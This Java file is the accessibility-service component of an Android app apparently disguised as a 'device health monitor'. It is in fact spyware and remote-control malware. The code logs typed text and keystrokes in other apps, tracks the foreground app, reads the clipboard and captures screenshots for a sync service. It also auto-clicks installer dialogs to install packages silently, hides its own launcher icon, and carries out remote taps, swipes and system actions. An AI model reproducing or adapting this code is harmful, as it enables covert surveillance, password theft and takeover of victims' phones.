package com.device.health.monitor;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.Path;
import android.os.Build;
import android.util.DisplayMetrics;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.util.List;
import java.util.concurrent.Executors;

public class MonitorService extends AccessibilityService {

    private static volatile MonitorService instance;

    // Package names of Android's package installer UI (varies by OEM/version)
    private static final String[] INSTALLER_PKGS = {
        "com.android.packageinstaller",
        "com.google.android.packageinstaller",
        "com.miui.packageinstaller",
        "com.samsung.android.packageinstaller",
        "com.samsung.android.app.packageinstaller",
        "com.huawei.appmarket",
        "com.oppo.market",
        "com.android.vending",           // Play Store installer
    };

    public static MonitorService getInstance() { return instance; }

    @Override
    protected void onServiceConnected() {
        instance = this;
        hideAppIcon();
    }

    @Override public void onInterrupt() {}

    @Override
    public void onDestroy() {
        instance = null;
        super.onDestroy();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int type = event.getEventType();

        // Auto-click installer dialogs
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
         || type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            CharSequence pkg = event.getPackageName();
            if (pkg != null) {
                String p = pkg.toString();
                boolean isInstaller = p.equals("android");
                if (!isInstaller) {
                    for (String ip : INSTALLER_PKGS) {
                        if (p.equals(ip)) { isInstaller = true; break; }
                    }
                }
                if (isInstaller) autoClickInstall();
            }
        }

        // Keylogger: capture text field changes
        if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            try {
                List<CharSequence> texts = event.getText();
                String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "?";
                if (!texts.isEmpty()) {
                    String t = texts.get(0).toString();
                    if (!t.isEmpty()) {
                        JSONObject e = new JSONObject();
                        e.put("type", "text");
                        e.put("pkg", pkg.substring(pkg.lastIndexOf('.') + 1));
                        e.put("data", t);
                        e.put("ts", System.currentTimeMillis());
                        SyncService svc = SyncService.getInstance();
                        if (svc != null) svc.addKeylog(e);
                    }
                }
            } catch (Exception ignored) {}
        }

        // Track focused app
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            try {
                String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
                String cls = event.getClassName() != null ? event.getClassName().toString() : "";
                if (!pkg.isEmpty() && !pkg.equals(getPackageName())) {
                    JSONObject e = new JSONObject();
                    e.put("type", "focus");
                    e.put("pkg", pkg.substring(pkg.lastIndexOf('.') + 1));
                    e.put("data", cls.substring(cls.lastIndexOf('.') + 1));
                    e.put("ts", System.currentTimeMillis());
                    SyncService svc = SyncService.getInstance();
                    if (svc != null) svc.addKeylog(e);
                }
            } catch (Exception ignored) {}
        }
    }

    /** Capture hardware key events for keylogging */
    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        if (event.getAction() == KeyEvent.ACTION_DOWN) {
            try {
                int kc = event.getKeyCode();
                int ch = event.getUnicodeChar();
                String data;
                if (ch > 32 && ch < 127) {
                    data = String.valueOf((char) ch);
                } else {
                    data = "[" + KeyEvent.keyCodeToString(kc) + "]";
                }
                JSONObject e = new JSONObject();
                e.put("type", "key");
                e.put("data", data);
                e.put("ts", System.currentTimeMillis());
                SyncService svc = SyncService.getInstance();
                if (svc != null) svc.addKeylog(e);
            } catch (Exception ignored) {}
        }
        return false; // don't consume
    }

    // ── Gesture dispatch (API 24+) ─────────────────────────────────────────────

    /** Tap at normalized coordinates (0.0–1.0). */
    void performTap(float nx, float ny) {
        if (Build.VERSION.SDK_INT < 24) return;
        try {
            DisplayMetrics dm = new DisplayMetrics();
            getSystemService(android.view.WindowManager.class)
                .getDefaultDisplay().getRealMetrics(dm);
            float x = nx * dm.widthPixels;
            float y = ny * dm.heightPixels;
            Path p = new Path();
            p.moveTo(x, y);
            GestureDescription.Builder b = new GestureDescription.Builder();
            b.addStroke(new GestureDescription.StrokeDescription(p, 0, 60));
            dispatchGesture(b.build(), null, null);
        } catch (Exception ignored) {}
    }

    /** Swipe between normalized coordinates. */
    void performSwipe(float nx1, float ny1, float nx2, float ny2, int durationMs) {
        if (Build.VERSION.SDK_INT < 24) return;
        try {
            DisplayMetrics dm = new DisplayMetrics();
            getSystemService(android.view.WindowManager.class)
                .getDefaultDisplay().getRealMetrics(dm);
            float x1 = nx1 * dm.widthPixels, y1 = ny1 * dm.heightPixels;
            float x2 = nx2 * dm.widthPixels, y2 = ny2 * dm.heightPixels;
            Path p = new Path();
            p.moveTo(x1, y1);
            p.lineTo(x2, y2);
            GestureDescription.Builder b = new GestureDescription.Builder();
            b.addStroke(new GestureDescription.StrokeDescription(p, 0, Math.max(100, durationMs)));
            dispatchGesture(b.build(), null, null);
        } catch (Exception ignored) {}
    }

    /** Perform a global system action by name. */
    void performGlobal(String action) {
        try {
            switch (action) {
                case "HOME":          performGlobalAction(GLOBAL_ACTION_HOME); break;
                case "BACK":          performGlobalAction(GLOBAL_ACTION_BACK); break;
                case "RECENT":        performGlobalAction(GLOBAL_ACTION_RECENTS); break;
                case "NOTIFICATIONS": performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS); break;
                case "POWER_DIALOG":
                    if (Build.VERSION.SDK_INT >= 21)
                        performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
                    break;
                case "LOCK":
                    if (Build.VERSION.SDK_INT >= 28)
                        performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
                    break;
                case "SCREENSHOT":
                    if (Build.VERSION.SDK_INT >= 28)
                        performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT);
                    break;
            }
        } catch (Exception ignored) {}
    }

    // ── Auto-install (PackageInstaller) ────────────────────────────────────────

    private void autoClickInstall() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;
            // By known view IDs
            String[] ids = {
                "com.android.packageinstaller:id/ok_button",
                "android:id/button1",
            };
            for (String viewId : ids) {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(viewId);
                if (nodes != null && !nodes.isEmpty()) {
                    AccessibilityNodeInfo n = nodes.get(0);
                    if (n.isEnabled()) { n.performAction(AccessibilityNodeInfo.ACTION_CLICK); return; }
                }
            }
            // By text
            String[] labels = {"Install", "INSTALL", "OK", "Allow", "Continue", "Next", "Done"};
            for (String label : labels) {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(label);
                if (nodes != null) {
                    for (AccessibilityNodeInfo n : nodes) {
                        CharSequence cls = n.getClassName();
                        if (cls != null && (cls.toString().contains("Button") || n.isClickable())
                                && n.isEnabled()) {
                            n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            return;
                        }
                    }
                }
            }
        } catch (Exception ignored) {}
    }

    // ── Icon hide ──────────────────────────────────────────────────────────────

    void hideAppIcon() {
        try {
            String pkg = getPackageName();
            android.content.ComponentName alias = new android.content.ComponentName(
                pkg, pkg + ".MainLauncher");
            getPackageManager().setComponentEnabledSetting(alias,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {}
        // Secondary attempt with DISABLED_USER state (Samsung/OEM launchers)
        try {
            String pkg = getPackageName();
            android.content.ComponentName alias = new android.content.ComponentName(
                pkg, pkg + ".MainLauncher");
            getPackageManager().setComponentEnabledSetting(alias,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER,
                android.content.pm.PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {}
    }

    // ── Clipboard ──────────────────────────────────────────────────────────────

    String getClipboard() {
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData cd = cm != null ? cm.getPrimaryClip() : null;
            if (cd != null && cd.getItemCount() > 0) {
                CharSequence t = cd.getItemAt(0).coerceToText(this);
                return t != null ? t.toString() : null;
            }
        } catch (Exception ignored) {}
        return null;
    }

    // ── Screenshot (API 30+) ───────────────────────────────────────────────────

    void snap() {
        if (Build.VERSION.SDK_INT < 30) return;
        try {
            takeScreenshot(android.view.Display.DEFAULT_DISPLAY,
                Executors.newSingleThreadExecutor(),
                new TakeScreenshotCallback() {
                    @Override
                    public void onSuccess(ScreenshotResult r) {
                        try {
                            Bitmap hw = Bitmap.wrapHardwareBuffer(r.getHardwareBuffer(), null);
                            if (hw != null) {
                                Bitmap bmp;
                                if (hw.getWidth() > 720) {
                                    int dstH = (int)(hw.getHeight() * (720f / hw.getWidth()));
                                    bmp = Bitmap.createScaledBitmap(hw, 720, dstH, true);
                                    hw.recycle();
                                } else {
                                    bmp = hw;
                                }
                                ByteArrayOutputStream out = new ByteArrayOutputStream();
                                bmp.compress(Bitmap.CompressFormat.JPEG, 35, out);
                                SyncService.pendingShot = out.toByteArray();
                                bmp.recycle();
                            }
                            r.getHardwareBuffer().close();
                        } catch (Exception ignored) {}
                    }
                    @Override public void onFailure(int code) {
                        // code 1=ERROR, 2=TIMEOUT, 3=NO_ACCESS
                        SyncService.snapFailCode = code;
                    }
                });
        } catch (Exception ignored) {}
    }
}
